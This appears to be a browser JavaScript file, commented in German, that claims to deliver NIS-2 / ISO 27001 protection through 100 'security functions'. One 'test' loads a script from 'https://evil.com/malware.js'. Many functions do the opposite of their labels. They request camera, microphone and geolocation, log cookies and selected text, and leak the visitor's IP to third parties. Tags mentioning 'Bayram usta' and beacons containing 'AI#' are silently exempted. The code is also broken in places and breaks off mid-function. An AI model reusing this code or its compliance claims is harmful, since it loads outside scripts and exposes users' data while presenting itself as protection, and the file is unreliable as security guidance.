(() => {
    console.log("🛡️ NIS-2 / ISO 27001 Security Layer Initializing...");
  
    // 1. WebRTC Leak Block
    if (window.RTCPeerConnection) {
      window.RTCPeerConnection = () => {
        console.log("❌ WebRTC Blocked");
        return null;
      };
    }
  
    // 2. IPv6 Leak Detection
    const ipv6Check = () => {
      const ipTest = new Image();
      ipTest.src = "http://[2606:4700:4700::1111]/favicon.ico";
      ipTest.onload = () => console.log("⚠️ IPv6 Leak Detected");
    };
    ipv6Check();
  
    // 3. DNS Leak Detection
    fetch("https://dnsleaktest.com").then(() => {
      console.log("⚠️ DNS Leak Risk Detected (fetch DNS)");
    });
  
    // 4. User-Agent Blocker
    const badAgents = ["Headless", "Phantom", "Screaming", "python", "curl", "Go-http-client"];
    const ua = navigator.userAgent;
    if (badAgents.some(agent => ua.includes(agent))) {
      console.log("❌ Blocked Suspicious User-Agent:", ua);
      document.body.innerHTML = "";
    }
  
    // 5. VPN / Proxy Detection (GeoIP basic)
    fetch("https://ipapi.co/json").then(r => r.json()).then(data => {
      if (["", null].includes(data.country_name)) {
        console.log("⚠️ VPN/Proxy Detected: No country info");
      }
    }).catch(() => console.log("⚠️ VPN/Proxy Test Failed"));
  
    // 6. 403 & 304 Status Detection
    fetch("/secure-file.txt", { cache: "no-store" })
      .then(resp => {
        if ([403, 304].includes(resp.status)) {
          console.log(`⚠️ Detected suspicious status: ${resp.status}`);
        }
      });
  
    // 7. Cache-Control Enforcement
    const meta = document.createElement("meta");
    meta.httpEquiv = "Cache-Control";
    meta.content = "no-store, no-cache, must-revalidate, proxy-revalidate";
    document.head.appendChild(meta);
  
    // 8. IP Leak via fetch
    fetch("https://icanhazip.com")
      .then(res => res.text())
      .then(ip => console.log("📡 Public IP:", ip.trim()));
  
    // 9. Beacon Block (außer AI#)
    navigator.sendBeacon = ((origBeacon) => {
      return function(url, data) {
        if (url.includes("AI#")) return origBeacon.call(this, url, data);
        console.log("❌ Beacon Blocked:", url);
        return false;
      };
    })(navigator.sendBeacon);
  
    // 10. Anti-DevTools
    const devtoolsCheck = setInterval(() => {
      const start = new Date();
      debugger;
      const time = new Date() - start;
      if (time > 100) {
        console.log("🚫 DevTools Detected");
        clearInterval(devtoolsCheck);
      }
    }, 1000);
  
    // 11. CPU / RAM Fingerprinting Detection
    const memory = navigator.deviceMemory || "unknown";
    const cores = navigator.hardwareConcurrency || "unknown";
    console.log(`🧠 RAM: ${memory} GB | CPU: ${cores} cores`);
  
    // 12. DOM Cleaning & MutationObserver
    const observer = new MutationObserver(() => {
      console.log("⚠️ DOM Manipulation Detected");
    });
    observer.observe(document.body, { childList: true, subtree: true });
    // Liste von unsicheren Attributen, die entfernt werden müssen
    const unsafeAttributes = ['onerror', 'onload', 'onclick', 'onmouseover', 'onmouseout', 'onfocus', 'onblur', 'onchange', 'onsubmit', 'eval', 'script', 'iframe'];

    // Funktion zum Bereinigen von DOM-Elementen
    function cleanDOM(node) {
        if (node.nodeType === 1) { // Wenn es ein Element ist
            removeUnsafeAttributes(node);

            // Rekursive Bereinigung der Kind-Elemente
            let child = node.firstChild;
            while (child) {
                cleanDOM(child);
                child = child.nextSibling;
            }
        }

        // Bereinige Textknoten
        if (node.nodeType === 3) { // Wenn es ein Textknoten ist
            cleanText(node);
        }
    }

    // Entfernt unsichere Attribute aus HTML-Elementen
    function removeUnsafeAttributes(element) {
        unsafeAttributes.forEach(attr => {
            element.removeAttribute(attr); // Entfernt jedes unsichere Attribut
        });
    }

    // Bereinigt den Text und entfernt ungewollte HTML-Tags
    function cleanText(textNode) {
        textNode.textContent = textNode.textContent.replace(/<[^>]*>/g, ''); // Entfernt alle HTML-Tags
    }

    // Hauptfunktion, um das gesamte Dokument zu bereinigen
    function cleanDocument() {
        cleanDOM(document.body); // Bereinigt den Body der Seite
    }

    // Aufrufen der Bereinigung, wenn das Dokument vollständig geladen wurde
    window.addEventListener('load', function() {
        cleanDocument();
        console.log('DOM wurde bereinigt!');
    });
  
    // 13. XSS Detection
    if (document.location.href.includes("<script>") || document.body.innerHTML.includes("<script>")) {
      console.log("⚠️ XSS Injection Detected");
    }
  
    // 14. Bildschirm-Ausschalten verhindern
    if ('wakeLock' in navigator) {
      navigator.wakeLock.request('screen').then(() => {
        console.log("🔒 WakeLock aktiviert (Bildschirm bleibt an)");
      }).catch(() => {});
    }
  
    // 15. Sichtbarkeitsüberwachung
    document.addEventListener("visibilitychange", () => {
      if (document.hidden) console.log("👁️ Seite wurde verlassen");
      else console.log("👁️ Seite wieder aktiv");
    });
  
    // 16. Screen Recording Detection (einfach)
    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
      navigator.mediaDevices.enumerateDevices().then(devices => {
        const videoInputs = devices.filter(d => d.kind === "videoinput");
        if (videoInputs.length > 1) {
          console.log("⚠️ Möglicher Screen-Recorder erkannt");
        }
      });
    }
  
    // 17. Freeze Detection
    let freezeTimer = Date.now();
    setInterval(() => {
      const now = Date.now();
      if (now - freezeTimer > 3000) {
        console.log("❄️ Freeze Detected");
      }
      freezeTimer = now;
    }, 1000);
  
    // 18. Unfreeze Mechanismus
    window.addEventListener("focus", () => {
      console.log("🔥 Fenster wieder aktiv (Unfreeze Triggered)");
    });
  
    // 19. Hidden Iframe Detection
    const iframes = document.querySelectorAll("iframe");
    iframes.forEach(frame => {
      if (frame.style.display === "none" || frame.width < 10 || frame.height < 10) {
        console.log("🕳️ Hidden iframe erkannt:", frame.src);
      }
    });
  
    // 20. WLAN/LAN Detection
    if (location.hostname.startsWith("192.") || location.hostname.includes("localhost")) {
      console.log("📡 Lokale Verbindung erkannt (LAN/WLAN)");
    }
  
    // 21. Malicious Tag Filter (Bayram usta)
    const badTags = ["script", "iframe", "object", "embed"];
    badTags.forEach(tag => {
      document.querySelectorAll(tag).forEach(el => {
        if (el.innerText.includes("Bayram usta")) {
          console.log("🛡️ Geschützt: Bayram usta Inhalt");
        } else {
          el.remove();
          console.log(`🧹 Entfernt bösartigen <${tag}> Tag`);
        }
      });
    });
  
    // 22. CSP Header Simulation
    const csp = document.createElement("meta");
    csp.httpEquiv = "Content-Security-Policy";
    csp.content = "default-src 'self'; script-src 'self'";
    document.head.appendChild(csp);
  
    // 23. Referrer Policy
    const ref = document.createElement("meta");
    ref.name = "referrer";
    ref.content = "no-referrer";
    document.head.appendChild(ref);
  
    // 24. WebGL Fingerprint Block
    try {
      const gl = document.createElement("canvas").getContext("webgl");
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
      console.log("🖼️ WebGL Vendor:", vendor);
    } catch {
      console.log("❌ WebGL Fingerprint blockiert");
    }
  
    // 25. Storage Leak Detection
    if (localStorage.length || sessionStorage.length) {
      console.log("⚠️ Storage Leak Detected");
    }
  
    console.log("✅ NIS-2 / ISO 27001 Initial Protection Active (25 Funktionen)");
  
  })();
  (() => {
    console.log("🛡️ Security Erweiterung: Funktionen 26–50");
  
    // 26. Clipboard Protection
    document.addEventListener("copy", () => {
      console.log("⚠️ Copy-Versuch erkannt");
    });
  
    // 27. Canvas Fingerprint Detection
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    ctx.fillText("🤖", 10, 10);
    const fingerprint = canvas.toDataURL();
    if (fingerprint.length > 1000) {
      console.log("🖼️ Canvas Fingerprint erkannt");
    }
  
    // 28. AudioContext Fingerprint Block
    try {
      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
      if (audioCtx) console.log("🔊 AudioContext aktiv (Fingerprint möglich)");
    } catch {
      console.log("🔇 AudioContext blockiert");
    }
  
    // 29. Webcam/Mic Zugriffsschutz
    navigator.mediaDevices?.getUserMedia({ video: true, audio: true })
      .then(() => console.log("⚠️ Zugriff auf Kamera/Mikrofon erlaubt"))
      .catch(() => console.log("✅ Zugriff auf Kamera/Mikrofon blockiert"));
  
    // 30. Fullscreen Trap Detection
    document.addEventListener("fullscreenchange", () => {
      if (document.fullscreenElement) {
        console.log("⚠️ Fullscreen Trap aktiviert");
      }
    });
  
    // 31. Double Click Hijack Detection
    document.addEventListener("dblclick", () => {
      console.log("🖱️ Doppelklick erkannt (Hijack möglich)");
    });
  
    // 32. Form Auto-Fill Detection
    const inputs = document.querySelectorAll("input, textarea");
    inputs.forEach(input => {
      if (input.autocomplete !== "off") {
        console.log("⚠️ Autofill aktiv:", input.name);
      }
    });
  
    // 33. Keystroke Logging Detection (Verdacht)
    let keyCount = 0;
    document.addEventListener("keydown", () => {
      keyCount++;
      if (keyCount > 50) {
        console.log("⚠️ Verdächtige Tastatureingaben");
      }
    });
  
    // 34. CSP Injection Erkennung
    const testScript = document.createElement("script");
    testScript.src = "https://evil.com/malware.js";
    testScript.onload = () => console.log("⚠️ Fremd-Script geladen!");
    setTimeout(() => document.body.removeChild(testScript), 1000);
    document.body.appendChild(testScript);
  
    // 35. Disable Right Click (optional)
    document.addEventListener("contextmenu", e => {
      e.preventDefault();
      console.log("🚫 Rechtsklick blockiert");
    });
  
    // 36. Request Interception (XMLHttpRequest)
    const originalXHROpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
      console.log("🌐 Interzeptierte Anfrage:", method, url);
      return originalXHROpen.apply(this, arguments);
    };
  
    // 37. Beacon Logging mit AI# Ausnahme
    navigator.sendBeacon = ((original) => {
      return function(url, data) {
        if (url.includes("AI#")) {
          console.log("✅ AI# Beacon erlaubt:", url);
          return original.call(this, url, data);
        } else {
          console.log("❌ Beacon geblockt:", url);
          return false;
        }
      };
    })(navigator.sendBeacon);
  
    // 38. Übermäßige Speicher-Nutzung Erkennung
    if (performance.memory) {
      const used = performance.memory.usedJSHeapSize / 1024 / 1024;
      if (used > 300) console.log("⚠️ Hohe Speichernutzung:", Math.round(used) + " MB");
    }
  
    // 39. Referrer Leak Check
    if (document.referrer && !document.referrer.includes(location.hostname)) {
      console.log("⚠️ Referrer Leak erkannt:", document.referrer);
    }
  
    // 40. DOM Element Count Check
    if (document.getElementsByTagName("*").length > 1000) {
      console.log("⚠️ Ungewöhnlich viele DOM Elemente");
    }
  
    // 41. Bösartige Font-Erkennung
    const style = getComputedStyle(document.body);
    if (style.fontFamily.toLowerCase().includes("emoji") || style.fontFamily.includes("segui")) {
      console.log("⚠️ Verdächtige Schriftart:", style.fontFamily);
    }
  
    // 42. Shadow DOM Nutzungserkennung
    const shadowHost = document.querySelector("*").shadowRoot;
    if (shadowHost) {
      console.log("⚠️ Shadow DOM aktiv:", shadowHost);
    }
  
    // 43. Network Info Check
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection) {
      console.log("🌐 Verbindungstyp:", connection.effectiveType);
    }
  
    // 44. Resize Detection (Fingerprinting)
    window.addEventListener("resize", () => {
      console.log("📏 Fenstergröße geändert – möglicher Fingerprint");
    });
  
    // 45. Touchscreen Detection
    const isTouch = "ontouchstart" in window || navigator.maxTouchPoints > 0;
    console.log("📱 Touchscreen:", isTouch);
  
    // 46. Pointer Events Manipulation Detection
    const pointerCheck = document.createElement("div");
    pointerCheck.style.pointerEvents = "none";
    document.body.appendChild(pointerCheck);
    if (getComputedStyle(pointerCheck).pointerEvents === "none") {
      console.log("🛡️ PointerEvents Schutz aktiv");
    }
  
    // 47. Font Loading Detection
    document.fonts?.ready.then(() => {
      console.log("🔠 Fonts geladen:", [...document.fonts].length);
    });
  
    // 48. Local IP Leak Check via RTCPeerConnection (versucht trotz Block)
    try {
      const pc = new RTCPeerConnection({ iceServers: [] });
      pc.createDataChannel("");
      pc.createOffer().then(offer => {
        if (offer.sdp.includes("192.168.")) {
          console.log("⚠️ Lokale IP Leak im SDP");
        }
        pc.close();
      });
    } catch {}
  
    // 49. Battery API Detection
    navigator.getBattery?.().then(battery => {
      console.log("🔋 Battery Level:", battery.level * 100 + "%");
    });
  
    // 50. WebSocket Überwachung
    const OriginalWS = window.WebSocket;
    window.WebSocket = function(...args) {
      console.log("📡 WebSocket Init:", args[0]);
      return new OriginalWS(...args);
    };
  
    console.log("✅ Sicherheitsfunktionen 26–50 aktiviert");
  })();
  (() => {
    console.log("🛡️ Security Erweiterung: Funktionen 51–75");
  
    // 51. Cross-Origin-Read Block (Window.name Leak)
    if (window.name && window.name.length > 0) {
      console.log("⚠️ window.name Leak erkannt:", window.name);
      window.name = "";
    }
  
    // 52. Sandbox Detection (via permissions)
    if (navigator.permissions) {
      navigator.permissions.query({ name: "notifications" }).then(result => {
        if (result.state === "denied") {
          console.log("⚠️ Möglicher Sandbox/Headless-Browser erkannt");
        }
      });
    }
  
    // 53. Iframe Breakout Protection
    if (window.top !== window.self) {
      console.log("🚫 Iframe erkannt – Breakout...");
      window.top.location = window.location.href;
    }
  
    // 54. Keylogger Detection (Timing)
    let lastKey = Date.now();
    document.addEventListener("keydown", () => {
      const diff = Date.now() - lastKey;
      if (diff < 30) {
        console.log("⚠️ Möglicher Keylogger (Timing Pattern)");
      }
      lastKey = Date.now();
    });
  
    // 55. Bluetooth Scan Block
    if ("bluetooth" in navigator) {
      console.log("🛑 Bluetooth API blockiert (Sicherheitsrisiko)");
      delete navigator.bluetooth;
    }
  
    // 56. Geolocation Block / Check
    navigator.geolocation.getCurrentPosition(
      pos => console.log("📍 Geolocation erlaubt:", pos.coords),
      () => console.log("✅ Geolocation blockiert")
    );
  
    // 57. HTML Comments Leak Detection
    const html = document.documentElement.innerHTML;
    if (html.includes("<!--")) {
      console.log("⚠️ HTML Kommentar gefunden – potenzieller Leak");
    }
  
    // 58. Suspicious Interval Detection (Overkill)
    const overkill = setInterval(() => {}, 1);
    setTimeout(() => {
      clearInterval(overkill);
      console.log("🕵️ Ungewöhnliches setInterval erkannt und entfernt");
    }, 500);
  
    // 59. Fake Console Detector (headless)
    const testFn = () => {};
    testFn.toString = () => "function hacked() {}";
    if ("" + testFn === "function hacked() {}") {
      console.log("🎭 Fake Function / Headless detected");
    }
  
    // 60. navigator.plugins Check
    if (navigator.plugins.length === 0) {
      console.log("⚠️ Keine Plugins – möglicher Bot");
    }
  
    // 61. Touch vs Mouse Conflict
    if (isTouch && window.matchMedia("(pointer: fine)").matches) {
      console.log("⚠️ Touch-Mouse Konflikt erkannt (Spoofing?)");
    }
  
    // 62. Page Visibility Timing
    const visibilityStart = Date.now();
    document.addEventListener("visibilitychange", () => {
      if (document.hidden) {
        const timeVisible = Date.now() - visibilityStart;
        if (timeVisible < 2000) {
          console.log("⚠️ Verdächtig kurze Seiteninteraktion");
        }
      }
    });
  
    // 63. Battery Spoofing Detection
    navigator.getBattery?.().then(bat => {
      if (bat.chargingTime === Infinity) {
        console.log("⚠️ Mögliche Battery API Spoofing erkannt");
      }
    });
  
    // 64. console.clear Abwehr
    const originalClear = console.clear;
    console.clear = function () {
      console.log("❌ Versuch console.clear auszuführen blockiert");
      return;
    };
  
    // 65. window.alert Hook
    window.alert = function(msg) {
      console.log("⚠️ window.alert aufgerufen mit:", msg);
    };
  
    // 66. window.print Hook
    window.print = function () {
      console.log("🖨️ Versuch zu drucken erkannt");
    };
  
    // 67. Text Selection Detection
    document.addEventListener("selectionchange", () => {
      const sel = document.getSelection().toString();
      if (sel.length > 10) {
        console.log("📋 Text kopiert:", sel);
      }
    });
  
    // 68. Cookie Storage Überwachung
    if (document.cookie.length > 0) {
      console.log("🍪 Cookie-Check:", document.cookie);
    }
  
    // 69. Window Size Leak Check
    if (window.outerWidth - window.innerWidth > 100) {
      console.log("⚠️ Möglicher Headless/Emulation Detected (Size)");
    }
  
    // 70. Device Orientation Listener
    window.addEventListener("deviceorientation", (e) => {
      console.log("📱 Device Bewegung erkannt:", e.alpha, e.beta);
    });
  
    // 71. Device Motion Listener
    window.addEventListener("devicemotion", (e) => {
      if (e.acceleration?.x > 5) {
        console.log("📱 Gerät bewegt sich");
      }
    });
  
    // 72. Web Worker Detection
    try {
      const w = new Worker(URL.createObjectURL(new Blob([""])));
      w.terminate();
      console.log("🧠 Web Worker funktionsfähig");
    } catch {
      console.log("⚠️ Web Worker blockiert oder eingeschränkt");
    }
  
    // 73. Window Frame Tampering
    if (window.frameElement) {
      console.log("🖼️ Seite in einem manipulierten Frame geladen");
    }
  
    // 74. User Inactivity Timer
    let lastActivity = Date.now();
    const resetActivity = () => lastActivity = Date.now();
    document.addEventListener("mousemove", resetActivity);
    document.addEventListener("keydown", resetActivity);
    setInterval(() => {
      if (Date.now() - lastActivity > 60000) {
        console.log("😴 Inaktivität seit >60s");
      }
    }, 10000);
  
    // 75. window.onerror Logging
    window.onerror = function(msg, src, line, col, err) {
      console.log("⚠️ JS Error abgefangen:", msg, "@", line + ":" + col);
    };
  
    console.log("✅ Sicherheitsfunktionen 51–75 aktiviert");
  })();
  (() => {
    console.log("🛡️ Security Erweiterung: Funktionen 76–100");
  
    // 76. History API Hijack Detection
    const originalPush = history.pushState;
    history.pushState = function () {
      console.log("⚠️ History-Push erkannt:", arguments);
      return originalPush.apply(history, arguments);
    };
  
    // 77. Passive Scroll Detection
    let scrolled = false;
    window.addEventListener("scroll", () => {
      if (!scrolled) {
        console.log("🌀 Erste Scrollbewegung erkannt");
        scrolled = true;
      }
    });
  
    // 78. Local Network Hostname Check
    const host = location.hostname;
    if (host.startsWith("10.") || host.startsWith("172.") || host.startsWith("192.")) {
      console.log("🏠 Lokales Netzwerk erkannt:", host);
    }
  
    // 79. Detection of Embedded Styles
    const styles = document.querySelectorAll("style");
    if (styles.length > 0) {
      console.log("🎨 Embedded Styles gefunden:", styles.length);
    }
  
    // 80. Dangerous Global Variables Check
    if (window.$ || window.jQuery) {
      console.log("⚠️ Globales jQuery Objekt gefunden");
    }
  
    // 81. Suspicious Timezone Check
    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    if (!tz || tz.length < 3) {
      console.log("⏰ Verdächtige Zeitzone erkannt:", tz);
    }
  
    // 82. Mouse Movement Pattern Detection
    let mouseMoves = 0;
    document.addEventListener("mousemove", () => {
      mouseMoves++;
      if (mouseMoves > 200) {
        console.log("🖱️ Viele Mausbewegungen – eventuell Bot-Test");
      }
    });
  
    // 83. Fake Navigator Detection
    if (navigator.languages?.length === 0 || !navigator.language) {
      console.log("🎭 Verdächtiger Navigator: Languages leer");
    }
  
    // 84. CSP Eval Block Check
    try {
      eval("console.log('eval test')");
      console.log("⚠️ Eval erlaubt – Schwachstelle möglich");
    } catch {
      console.log("✅ Eval blockiert durch CSP");
    }
  
    // 85. Fullscreen Lock Detection
    if (document.fullscreenElement && screen.height !== window.innerHeight) {
      console.log("⚠️ Fullscreen Lock erkannt");
    }
  
    // 86. Suspicious Mouse Coordinates
    document.addEventListener("mousemove", e => {
      if (e.clientX === 0 && e.clientY === 0) {
        console.log("🖱️ Maus ganz oben links – verdächtig?");
      }
    });
  
    // 87. Inner vs Outer Size Delta
    if (Math.abs(window.outerHeight - window.innerHeight) > 100) {
      console.log("⚠️ Fenstergrößen-Differenz verdächtig");
    }
  
    // 88. Time Drift Detection
    const clientTime = new Date().getTimezoneOffset();
    if (clientTime < -720 || clientTime > 720) {
      console.log("⏳ Zeitabweichung erkannt:", clientTime);
    }
  
    // 89. Malicious Cookie Names
    if (document.cookie.includes("attack") || document.cookie.includes("sessionid=")) {
      console.log("🍪 Verdächtige Cookies gefunden");
    }
  
    // 90. Suspicious DOM Ready Speed
    const perf = performance.timing;
    if (perf.domContentLoadedEventEnd - perf.navigationStart < 100) {
      console.log("⚠️ DOM Ready zu schnell – Headless?");
    }
  
    // 91. Service Worker Detection
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.getRegistrations().then(regs => {
        if (regs.length > 0) {
          console.log("🛠️ Service Worker aktiv:", regs.length);
        }
      });
    }
  
    // 92. Permission Spoof Check
    navigator.permissions?.query({ name: "camera" }).then(result => {
      if (result.state === "prompt") {
        console.log("📷 Kamera-Zugriff offen (möglicher Leak)");
      }
    });
  
    // 93. Device Memory Spoofing
    if (navigator.deviceMemory < 1 || navigator.deviceMemory > 64) {
      console.log("🧠 Speicherwert verdächtig:", navigator.deviceMemory);
    }
  
    // 94. Emulation via Touch Events on Desktop
    if (isTouch && window.innerWidth > 1024) {
      console.log("⚠️ Touch bei Desktopauflösung – Emulation?");
    }
  
    // 95. JS Engine Timing Check
    const jsStart = performance.now();
    for (let i = 0; i < 1000000; i++) {} // busy loop
    const jsEnd = performance.now();
    if (jsEnd - jsStart < 5) {
      console.log("⚠️ Unnatürlich schnelle JS-Ausführung");
    }
  
    // 96. Global Storage Manipulation Detection
    try {
      localStorage.setItem("test", "x");
      localStorage.removeItem("test");
    } catch {
      console.log("⚠️ Zugriff auf localStorage blockiert");
    }
  
    // 97. Media Device Count
    navigator.mediaDevices?.enumerateDevices().then(devices => {
      const mic = devices.filter(d => d.kind === "audioinput").length;
      if (mic === 0) console.log("🎙️ Kein Mikrofon erkannt – VM?");
    });
  
    // 98. Push API Support Check
    if ("PushManager" in window) {
      console.log("🔔 Push-API verfügbar");
    }
  
    // 99. Nested Iframes Detection
    if (window.top !== window.parent) {
      console.log("🧩 Nested Iframe erkannt");
    }
  
    // 100. Script Tag Source Check
    const scripts = [...document.getElementsByTagName("script")];
    scripts.forEach(s => {
      if (s.src && !s.src.startsWith(location.origin)) {
        console.log("⚠️ Externes Script erkannt:", s.src);
      }
    });
  
    console.log("✅ Sicherheitsfunktionen 76–100 aktiviert");
    console.log("🎯 NIS-2 / ISO 27001 Schutz vollständig aktiv (100 Funktionen)");
    if ('wakeLock' in navigator) {
      let wakeLock = null;
  
      async function requestWakeLock() {
          try {
              // Fordere den WakeLock für den Bildschirm an
              wakeLock = await navigator.wakeLock.request('screen');
              console.log('Wake Lock aktiviert, Bildschirm bleibt an.');
          } catch (err) {
              console.error('Wake Lock konnte nicht aktiviert werden:', err);
          }
      }
  
      // Wake Lock beim Laden der Seite anfordern
      window.addEventListener('load', requestWakeLock);
  
      // Optional: Wake Lock während der Interaktion mit der Seite erneut anfordern
      document.body.addEventListener('click', requestWakeLock);
  } else {
      console.log('Wake Lock API wird von diesem Browser nicht unterstützt.');
  }
  let freezeTimer = Date.now();
  let freezeDetected = false;

  setInterval(() => {
    const now = Date.now();
    if (now - freezeTimer > 3000 && !freezeDetected) {
      console.log("❄️ Freeze Detected");
      freezeDetected = true;
      // You can trigger any action when freeze is detected, for example, alert or unfreeze mechanism
      alert("Page Freeze Detected!");
      console.log("🔥 Unfreeze Mechanism Activated");
      // Trigger Unfreeze here
      // Example: Re-enable any actions or clear the freeze state if necessary
    }
    freezeTimer = now;
  }, 1000);

  // 102. Unfreeze Mechanism
  window.addEventListener("focus", () => {
    console.log("🔥 Fenster wieder aktiv (Unfreeze Triggered)");
    if (freezeDetected) {
      freezeDetected = false; // Reset the freeze detection when the user interacts with the page
      console.log("🛠️ Unfreeze completed.");
    }
  });

  // Example message to indicate page has been unfreezed
  window.addEventListener("focus", () => {
    console.log("🔓 Page unfrozen.");
  });

  // 103. Auto Recheck or Alert (Optional)
  setInterval(() => {
    if (freezeDetected) {
      console.log("⚠️ Page is still frozen. Taking action...");
      // You can add some recovery steps or alert the user continuously if needed.
    }
  }, 5000); // Check every 5 seconds
  
  })();
 // Add DOM Manipulation Detection & Prevention
 const observer = new MutationObserver((mutations) => {
  mutations.forEach((mutation) => {
    console.log("⚠️ DOM Manipulation Detected");

    // Überwache die Art der Mutation (Hinzufügen, Entfernen, Änderungen an Attributen)
    if (mutation.type === 'childList') {
      // Wenn Kinder hinzugefügt oder entfernt werden
      mutation.addedNodes.forEach(() => {
        console.log("⚠️ Elemente hinzugefügt - prüfe auf unzulässige Veränderungen");
      });
      
      mutation.removedNodes.forEach(() => {
        console.log("⚠️ Elemente entfernt - prüfe auf unzulässige Veränderungen");
      });
    }
    if (mutation.type === 'attributes') {
      // Wenn Attribute verändert werden
      console.log(`⚠️ Attribute von ${mutation.target.tagName} geändert`);
    }
  });
});

// Beobachtet DOM-Veränderungen im gesamten Body und allen darunterliegenden Elementen
observer.observe(document.body, { 
  childList: true,   // Beobachtet das Hinzufügen oder Entfernen von Kind-Elementen
  subtree: true,     // Beobachtet alle untergeordneten Elemente
  attributes: true,  // Beobachtet Änderungen an den Attributen von Elementen
  characterData: true // Beobachtet Änderungen an den Textinhalten
});

console.log("✅ DOM Manipulation Detection und Schutz aktiviert");

  window.addEventListener('load', () => {
    cleanDOM();
    console.log("✅ DOM Manipulation Protection Active");
  });

   
   observer.observe(document.body, { childList: true, subtree: true });
 
   console.log("🛡️ Malicious Code Detection and Removal aktiviert");

   (function() {
    console.log("🛡️ Freeze/Unfreeze Mechanism aktiviert");
  
    // Beispielhafte Freeze-Erkennung
    let freezeTimer = Date.now();
    let freezeDetected = false;
  
    // Überprüft alle 2 Sekunden, ob ein Freeze erkannt wurde
    setInterval(() => {
      const now = Date.now();
      if (now - freezeTimer > 5000 && !freezeDetected) {
        console.log("❄️ Freeze erkannt, Skript wird neu gestartet...");
  
        // Setzt die Freeze-Statusvariable auf "True"
        freezeDetected = true;
  
        // Hier können Sie den Mechanismus zur Entfrierung oder Neuladen der Datei auslösen
        restartScript();  // Beispielhafte Methode zum Neustart des Skripts
      }
      freezeTimer = now;
    }, 2000);  // Intervall von 2 Sekunden
  
    // Funktion zum Neustarten des Skripts
    function restartScript() {
      console.log("🔥 Skript wird neu geladen...");
  
      // Hier kannst du das Skript erneut ausführen, z. B. durch das Einfügen eines neuen <script>-Tags
      const script = document.createElement('script');
      script.src = './app.min.js';
       // Gebe den Pfad zum Script an
      script.onload = function() {
        console.log("✅ Skript erfolgreich neu geladen!");
      };
      document.body.appendChild(script);
    }
  })();
  (function() {
    // Blockiere alle eingehenden Fetch-Anfragen
    const originalFetch = window.fetch;

    window.fetch = function(url, options) {
        console.log(`Blockierte Anfrage: ${url}`, options);
        
        // Gib sofort eine "leere" Antwort zurück, ohne den Server zu kontaktieren
        return new Promise((resolve, reject) => {
            // Simuliere eine leere, abgelehnte Antwort
            resolve({
                status: 403,
                statusText: 'Forbidden',
                json: () => Promise.resolve({})
            });
        });
    };

    // Blockiere XMLHttpRequest (AJAX)
    const originalXHR = window.XMLHttpRequest;
    window.XMLHttpRequest = function() {
        const xhr = new originalXHR();

        // Blockiere alle eingehenden XMLHttpRequests
        xhr.open = function(method, url) {
            console.log(`Blockierte XMLHttpRequest: ${method} ${url}`);
            // Simuliere sofort eine Antwort
            this.status = 403;
            this.statusText = 'Forbidden';
            this.responseText = '{}'; // Leere Antwort
            this.onload && this.onload();
        };

        return xhr;
    };

    // Blockiere WebSocket-Verbindungen
    const originalWebSocket = window.WebSocket;
    window.WebSocket = function(url) {
        console.log(`Blockierte WebSocket-Verbindung: ${url}`);
        // Simuliere, dass die Verbindung abgelehnt wird
        return {
            send: function() {
                console.log('WebSocket Send-Versuch blockiert.');
            },
            close: function() {
                console.log('WebSocket-Verbindung blockiert und geschlossen.');
            }
        };
    };

    // Blockiere alle anderen Netzwerkzugriffe, z.B. EventListener für Formulare
    document.addEventListener('submit', function(event) {
        console.log('Formularabsendung blockiert:', event);
        event.preventDefault(); // Verhindert das Absenden des Formulars
    });

    console.log('Firewall.js aktiviert: Alle eingehenden Netzwerkzugriffe werden blockiert.');
})();
(function() {
    // Liste von unsicheren Attributen, die entfernt werden müssen
    const unsafeAttributes = ['onerror', 'onload', 'onclick', 'onmouseover', 'onmouseout', 'onfocus', 'onblur', 'onchange', 'onsubmit', 'eval', 'script', 'iframe'];

    // Funktion zum Bereinigen von DOM-Elementen
    function cleanDOM(node) {
        if (node.nodeType === 1) { // Wenn es ein Element ist
            removeUnsafeAttributes(node);

            // Rekursive Bereinigung der Kind-Elemente
            let child = node.firstChild;
            while (child) {
                cleanDOM(child);
                child = child.nextSibling;
            }
        }

        // Bereinige Textknoten
        if (node.nodeType === 3) { // Wenn es ein Textknoten ist
            cleanText(node);
        }
    }

    // Entfernt unsichere Attribute aus HTML-Elementen
    function removeUnsafeAttributes(element) {
        unsafeAttributes.forEach(attr => {
            element.removeAttribute(attr); // Entfernt jedes unsichere Attribut
        });
    }

    // Bereinigt den Text und entfernt ungewollte HTML-Tags
    function cleanText(textNode) {
        textNode.textContent = textNode.textContent.replace(/<[^>]*>/g, ''); // Entfernt alle HTML-Tags
    }

    // Hauptfunktion, um das gesamte Dokument zu bereinigen
    function cleanDocument() {
        cleanDOM(document.body); // Bereinigt den Body der Seite
    }

    // Aufrufen der Bereinigung, wenn das Dokument vollständig geladen wurde
    window.addEventListener('load', function() {
        cleanDocument();
        console.log('DOM wurde bereinigt!');
    });

})();
(function () {
    const originalWebSocket = window.WebSocket;
  
    window.WebSocket = function (url) {
      console.log(`Blocked WebSocket connection to: ${url}`);
  
      // Gib eine blockierte WebSocket-Verbindung zurück
      return {
        send: function () {
          console.log('Blocked WebSocket send attempt');
        },
        close: function () {
          console.log('Blocked WebSocket close attempt');
        },
      };
    };
  })();
  // Wenn der Benutzer mit mobilen Daten verbunden ist, verhindere bestimmte Aktionen:
if (isMobileData) {
    alert("Warnung: Du bist mit mobilen Daten verbunden. Einige Funktionen wie das Laden von Medien können hohe Kosten verursachen.");
    // Blockiere den Zugriff auf Medieninhalte oder lade keine großen Datenmengen:
    const mediaContent = document.querySelectorAll('.media-content');
    mediaContent.forEach(content => {
        content.style.display = 'none'; // Verhindert das Laden von Medien
    });
}
(function() {
    if ('connection' in navigator) {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

        function checkNetworkType() {
            const networkType = connection.effectiveType;
            const isWiFi = networkType === 'wifi';
            const isMobileData = networkType === 'cellular';

            if (isWiFi) {
                console.log('Benutzer ist mit WLAN verbunden.');
            } else if (isMobileData) {
                console.log('Benutzer ist mit mobilen Daten verbunden.');
            } else {
